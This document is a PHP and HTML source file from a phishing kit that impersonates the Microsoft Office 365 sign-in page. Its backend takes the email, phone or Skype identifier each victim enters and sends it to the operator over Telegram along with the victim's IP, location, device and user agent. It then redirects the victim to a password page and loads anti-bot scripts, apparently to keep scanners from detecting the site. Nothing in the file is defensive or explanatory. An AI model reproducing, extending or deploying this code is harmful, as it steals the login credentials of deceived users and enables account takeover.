<?php
// login.php - Complete backend + frontend
require_once 'config.php';
require_once 'functions.php';

// If coming back from password page with email parameter, pre-fill the email
$prefilled_email = '';
if (isset($_GET['email'])) {
    $prefilled_email = htmlspecialchars($_GET['email']);
    // Also set session to maintain state
    $_SESSION['user_account'] = $prefilled_email;
}

// Include anti-bot protection (variables now come from config.php)
$anti_bot_path = ANTI_BOT_PATH;

if (file_exists($anti_bot_path . 'anti-bot.php')) {
    require_once $anti_bot_path . 'anti-bot.php';
    antiBotCheck(); // Run anti-bot check
}
if (file_exists($anti_bot_path . 'bot-check.php')) {
    require_once $anti_bot_path . 'bot-check.php';
}
if (file_exists($anti_bot_path . 'ipblock.php')) {
    require_once $anti_bot_path . 'ipblock.php';
}
if (file_exists($anti_bot_path . 'refspam.php')) {
    require_once $anti_bot_path . 'refspam.php';
}

// Check if form was submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_input'])) {
    
    $user_input = trim($_POST['login_input']);
    
    if (!empty($user_input)) {
        
        $_SESSION['user_account'] = $user_input;
        
       // Get IP and location
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$location = getLocationFromIP($ip);
$device = getDeviceType($userAgent);

// Prepare Telegram message with new format
$message = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🔐 OFFICE 365\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "⏰ Time: " . date('Y-m-d H:i:s') . "\n";
$message .= "🌐 IP Address: " . $ip . "\n";
$message .= "📍 Location: " . $location . "\n";
$message .= "📱 Device: " . $device . "\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "👤 Email/Phone/Skype: " . $user_input . "\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🔍 User Agent: " . $userAgent . "\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        
        sendToTelegram($message);
        logCapture($user_input, 'OFFICE365_EMAIL');
        
        header('Location: password.php');
        exit();
        
    } else {
        $error = "Please enter your email, phone, or Skype.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- FAVICON -->
<link rel="icon" type="image/png" href="assets/images/favicon.png">

<title>Sign in to your Microsoft account</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:"Segoe UI", "Helvetica Neue", sans-serif;
}

body{
    min-height:100vh;
    background:#f2f2f2;
    display:flex;
    justify-content:center;
    align-items:center;
    overflow:hidden;
    position:relative;
}

/* MICROSOFT BACKGROUND */
body::before{
    content:"";
    position:absolute;
    inset:0;
    background:
    radial-gradient(circle at top right,#ece8f3 0%,transparent 34%),
    radial-gradient(circle at bottom left,#e7eef8 0%,transparent 34%);
    z-index:0;
}

/* MAIN WRAPPER */
.wrapper{
    width:100%;
    max-width:440px;
    position:relative;
    z-index:2;
}

/* LOGIN CARD */
.login-box{
    width:100%;
    background:#fff;
    padding:44px;
    box-shadow:0 2px 10px rgba(0,0,0,0.18);
}

/* LOGO */
.logo img{
    width:108px;
    height:auto;
    margin-bottom:16px;
    display:block;
}

/* TITLE */
h1{
    font-size:32px;
    font-weight:600;
    color:#1b1b1b;
    margin-bottom:18px;
}

/* INPUT */
.input-box{
    width:100%;
    margin-bottom:0;
}

.input-box input{
    width:100%;
    border:none;
    border-bottom:1px solid #666;
    outline:none;
    background:transparent;
    font-size:15px;
    padding:6px 0;
    color:#111;
}

.input-box input:focus{
    border-bottom:2px solid #0067b8;
}

/* TEXT */
.text{
    margin-top:16px;
    font-size:13px;
    color:#1b1b1b;
}

.text a,
.link{
    color:#0067b8;
    text-decoration:none;
}

.text a:hover,
.link:hover{
    text-decoration:underline;
}

/* LINK */
.link{
    display:inline-block;
    margin-top:16px;
    font-size:13px;
}

/* BUTTON AREA */
.btn-area{
    margin-top:28px;
    display:flex;
    justify-content:flex-end;
}

/* BUTTON */
button{
    min-width:108px;
    height:32px;
    border:none;
    background:#0067b8;
    color:#fff;
    font-size:15px;
    cursor:pointer;
    transition:0.2s;
}

button:hover{
    background:#005da6;
}

/* SIGN-IN OPTIONS */
.signin-options{
    width:100%;
    height:48px;
    margin-top:14px;
    display:flex;
    align-items:center;
    gap:12px;
    cursor:pointer;
}

/* KEY ICON IMAGE */
.key-icon{
    width:20px;
    height:20px;
    object-fit:contain;
    flex-shrink:0;
}

/* SIGN-IN TEXT */
.signin-options span{
    font-size:15px;
    color:#1b1b1b;
    font-weight:400;
}

/* ERROR MESSAGE */
.error-message{
    color:#d32f2f;
    font-size:13px;
    margin-top:10px;
    padding:8px;
    background:#ffebee;
    border-left:3px solid #d32f2f;
}

/* FOOTER */
.footer{
    position:absolute;
    bottom:10px;
    right:18px;
    display:flex;
    gap:20px;
    z-index:2;
}

.footer a{
    font-size:12px;
    color:#222;
    text-decoration:none;
}

.footer a:hover{
    text-decoration:underline;
}

/* TABLET */
@media(max-width:768px){

    .wrapper{
        padding:0 16px;
    }

    .login-box{
        padding:40px 36px;
    }
}

/* MOBILE */
@media(max-width:600px){

    body{
        background:#fff;
        align-items:flex-start;
    }

    body::before{
        display:none;
    }

    .wrapper{
        max-width:100%;
        padding:0;
    }

    .login-box{
        min-height:100vh;
        padding:24px;
        box-shadow:none;
    }

    .logo img{
        width:100px;
    }

    h1{
        font-size:28px;
    }

    .footer{
        left:16px;
        right:auto;
        gap:16px;
        flex-wrap:wrap;
    }
}

</style>
</head>

<body>

<div class="wrapper">

    <form method="POST" action="">
    
    <div class="login-box">

        <!-- LOGO -->
        <div class="logo">
            <img src="assets/images/logo.svg" alt="Microsoft Logo">
        </div>

        <!-- TITLE -->
        <h1>Sign in</h1>

        <!-- INPUT - FIXED: Added input-box div wrapper -->
        <div class="input-box">
            <input type="text" name="login_input" placeholder="Email, phone, or Skype" value="<?php echo isset($_POST['login_input']) ? htmlspecialchars($_POST['login_input']) : $prefilled_email; ?>" required>
        </div>

        <!-- ERROR MESSAGE -->
        <?php if(isset($error)): ?>
            <div class="error-message">
                ⚠️ <?php echo $error; ?>
            </div>
        <?php endif; ?>

        <!-- CREATE ACCOUNT -->
        <div class="text">
            No account?
            <a href="#">Create one!</a>
        </div>

        <!-- HELP LINK -->
        <a href="#" class="link">Can’t access your account?</a>

        <!-- BUTTON -->
        <div class="btn-area">
            <button type="submit">Next</button>
        </div>

        <!-- SIGN-IN OPTIONS -->
        <div class="signin-options">

            <img src="assets/images/key.svg" class="key-icon" alt="Key Icon">

            <span>Sign-in options</span>

        </div>

    </div>
    
    </form>

</div>

<!-- FOOTER -->
<div class="footer">
    <a href="#">Terms of use</a>
    <a href="#">Privacy & cookies</a>
    <a href="#">•••</a>
</div>

</body>
</html>